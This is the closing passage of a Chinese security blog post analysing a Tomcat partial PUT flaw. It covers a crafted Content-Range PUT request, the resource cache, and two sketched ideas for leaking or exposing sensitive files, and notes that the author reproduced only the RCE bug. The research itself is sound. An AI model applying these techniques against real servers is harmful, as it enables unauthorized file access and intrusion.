<p>put 123文件 内容为66 range为Content-Range:bytes 200-1000/67589(range随便设的，我这个文件长度没这么长，这里情况是覆盖最后n位等同于我们的put进的内容)</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183103023.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183103023.png" alt="image-20250312183103023"  />
</a>
</div>

</p>
<p>现在看一眼123</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183122544.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183122544.png" alt="image-20250312183122544"  />
</a>
</div>

</p>
<p>所以说partialPut方法读取了临时文件夹下的对应文件内容</p>
<p>随后<code>resourceInputStream</code>进入了<code>resources.write</code>方法,这个方法下有个注释有点怪</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183417739.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183417739.png" alt="image-20250312183417739"  />
</a>
</div>

</p>
<p>这个cache好像是用来给正在上传的文件加锁的？没有被remove的话无法被访问的样子</p>
<p>这里有这么些文件地址</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183517631.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312183517631.png" alt="image-20250312183517631"  />
</a>
</div>

</p>
<p>但是后面我自己测试，发现就算在这个cache里好像也能访问，不知道啥原因了(晕)</p>
<p>那我其实对此大致的思路就有两种</p>
<ol>
<li>通过某些报错将resourceInputStream的内容带出来，造成泄漏</li>
<li>(我的这个cache环境有问题的情况下QAQ)在cache中的文件路径无法访问，且敏感文件在网站目录下的子目录(文件)中，通过我们恶意的往对应路径构造put请求，将该敏感文件从cache中remove掉，从而能够访问这个敏感文件(不过WEB-INF和MATA-INF还是访问不到，tomcat已经硬编码在代码中不准以这俩玩意开头了)</li>
</ol>
<h2 id="结尾">结尾</h2>
<p>只复现出来了RCE的洞，简单提了一下我在信息泄露这方面的一些思路，如果文章内容有错误还请师傅联系我纠正😭~</p>

        </div>
    </div>
    <a href="#" id="scrollToTopButton">
        <svg t="1686753152588" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"
            p-id="3988" width="48" height="48">
            <path
                d="M518.5 360.3c-3.2-4.4-9.7-4.4-12.9 0l-178 246c-3.8 5.3 0 12.7 6.5 12.7H381c10.2 0 19.9-4.9 25.9-13.2L512 460.4l105.2 145.4c6 8.3 15.6 13.2 25.9 13.2H690c6.5 0 10.3-7.4 6.5-12.7l-178-246z"
                p-id="3989" fill="#363636"></path>
            <path
                d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64z m0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"
                p-id="3990" fill="#363636"></path>
        </svg>
    </a>

<div class="pp-container">
        <section class="pre-and-post">
            <div class="has-text-left">
                
                <p>Previous post</p>
                <a href="http://localhost:1313/post/2025n1junior-wp/">[2025]N1junior-WP</a>
                
            </div>
            <div class="has-text-right">
                
                <p>Next post</p>
                <a href="http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">软件攻防赛现场赛上对justDeserialize攻击的几次尝试</a>
                
            </div>
        </section>
    </div>

</div>

        </main><footer class="footer">
    <div class="content has-text-centered">
    <span>&copy; 2025 <a href="http://localhost:1313/">GSBP&#39;s Blog</a></span>
    
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
    
    <span>
        Powered by
        <a href="https://gohugo.io/" target="_blank">Hugo</a> &
        <a href="https://github.com/hotjuicew/hugo-JuiceBar" target="_blank">JuiceBar</a>
    </span>
    </div>
  </footer>
</body>
</html>

